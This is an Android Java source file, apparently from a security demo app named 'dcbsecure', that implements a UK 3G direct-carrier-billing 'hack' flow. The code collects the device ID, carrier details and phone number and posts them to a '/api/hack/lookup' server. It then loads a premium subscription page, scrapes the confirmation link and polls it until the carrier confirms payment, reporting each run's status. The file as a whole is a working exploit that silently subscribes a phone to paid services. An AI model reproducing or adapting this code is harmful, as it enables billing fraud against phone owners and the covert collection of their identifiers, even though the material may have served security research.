package com.dcbsecure.demo201503.dcbsecure.flow.UK;

import android.content.Context;

import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import android.widget.Button;
import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.flow.FlowUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowUK3G implements View.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;
    private final Button btnStart;

    public FlowUK3G(ActivityMainWindow activityMainWindow, Button btnStart)
    {
        this.activityMainWindow = activityMainWindow;
        this.btnStart = btnStart;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }

    private void onClick()
    {
        Log.d("DCBSECURE", "Started handling payment over 3G");
        btnStart.setVisibility(View.INVISIBLE);

        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    //reset pin
                    FlowUtil.setPin(null);

                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("deviceid", deviceid));
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                    if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));

                    params.add(new BasicNameValuePair("wifi", FlowUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent, activityMainWindow);

                    if (hackConfigResponse == null)
                    {
                        String subject = "could not read start url";
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true,subject, "deviceid:" + deviceid);
                        activityMainWindow.updateLogs("\n" + subject);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(hackConfigResponse, deviceid, runid);
                    }
                }
                catch (JSONException e)
                {
                    String subject = "could not read start url";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    Log.d("DCBSECURE",subject);
                    activityMainWindow.updateLogs("\n" + subject);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String subject = "unexpected exception:" + e.getClass().getName() + " " + e.getMessage();
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, stack);
                    Log.d("DCBSECURE", subject );
                    activityMainWindow.updateLogs("\n" + subject);
                }

            }
        }).start();
    }


    private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid)
            throws Exception
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl;
        try
        {
            startUrl = hackConfig.getString("start_url")+"&tx=1";
        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,null);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }

        activityMainWindow.updateLogs("\nStarting UK 3G flow");

        RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
        String serverUrl = resultAfterStart != null ? extractServerUrl(resultAfterStart.getUrl()) : null;
        String htmlDataAfterStart = resultAfterStart != null ? resultAfterStart.getContent() : null; // html content

        if (resultAfterStart == null)
        {
            String subject = "start_url returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (resultAfterStart.getHttpCode() != 200)
        {
            String subject = "start_url returns http code " + resultAfterStart.getHttpCode()+" "+resultAfterStart.getUrl();
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (serverUrl == null)
        {
            String subject = "cannot workout server url from " + resultAfterStart.getUrl();
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (htmlDataAfterStart != null && !htmlDataAfterStart.contains("Subscribe Now") && !htmlDataAfterStart.contains("Buy"))
        {
            String subject = "UK expected msisdn entry page does not look right (3G flow)";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n"+subject);
            return;
        }
        else
        {
            doClickSubscribe(deviceid,runid,activityMainWindow,serverUrl,userAgent,htmlDataAfterStart);
        }

    }

    public static void doClickSubscribe(String deviceid, long runid, ActivityMainWindow activityMainWindow, String serverUrl, String userAgent, String htmlDataAfterStart)
            throws Exception
    {
        RequestResult resultAfterConfirm = null;
        String htmlDataAfterConfirm = null;

        String checkUrl = extractSubscribeUrl(htmlDataAfterStart,serverUrl);

        final long WAITING_TIME = 130000;
        final long END_TIME = System.currentTimeMillis() + WAITING_TIME;

        while (checkUrl!=null && System.currentTimeMillis() <= END_TIME)
        {
            resultAfterConfirm = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, checkUrl, userAgent);
            htmlDataAfterConfirm = resultAfterConfirm != null ? resultAfterConfirm.getContent() : null;

            checkUrl = extractSubscribeUrl(htmlDataAfterConfirm,serverUrl);
            if(checkUrl==null) break;

            //loop waiting while subscription setup is being processed by the carrier
            try
            {
                activityMainWindow.updateLogsNoLineFeed(" .");

                Thread.sleep(5000); //5 sec
            }
            catch (InterruptedException ex)
            {
                Thread.currentThread().interrupt();
            }

        }

        if (resultAfterConfirm==null || htmlDataAfterConfirm==null)
        {
            String subject = "Setup check returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if(System.currentTimeMillis() > END_TIME && checkUrl!=null)
        {
            String subject = "Timeout whilst setup is being processed by the carrier";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if(htmlDataAfterConfirm.toLowerCase().contains("payment received"))
        {
            String subject = "successful signup after pin confirm (UK wifi flow)";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else//passed (possibly)
        {

            RequestResult followRedirect = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, resultAfterConfirm.getUrl(), userAgent);
            final String followRedirectUrl = followRedirect != null ? followRedirect.getUrl() : null;
            final String htmlDataAfterFollowRedirect = followRedirect != null ? followRedirect.getContent() : null;

            String subject;
            if (followRedirectUrl != null && followRedirectUrl.contains("flirtymob.com"))
            {
                subject = "success";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            }
            else if(htmlDataAfterFollowRedirect!=null && htmlDataAfterFollowRedirect.toLowerCase().contains("pending"))
            {
                subject = "success; payment is currently pending, you should receive soon an advice of charge by sms";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterFollowRedirect);
            }
            else
            {
                subject = "success (?); final redirection seems odd";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterFollowRedirect);
            }

            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
    }

    private static String extractSubscribeUrl(String htmlData, String serverPath)
    {
        if(htmlData!=null && htmlData.contains("/check\">click here</a>"))
        {
            Pattern pattern = Pattern.compile("<a href=\"(/web_subscriptions/.*/check)\">click here</a>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return serverPath+matcher.group(1);
        }

        return null;
    }

    private static String extractServerUrl(String url)
    {
        //landingUrlAfterStart might look like http://migpay.com/web_subscriptions/4R5BAJ/enter_code = > extract http://migpay.com
        int indexEndOfServer = url.indexOf("/", 7); //start searching after http:// to find the first /
        return url.substring(0, indexEndOfServer);
    }

}
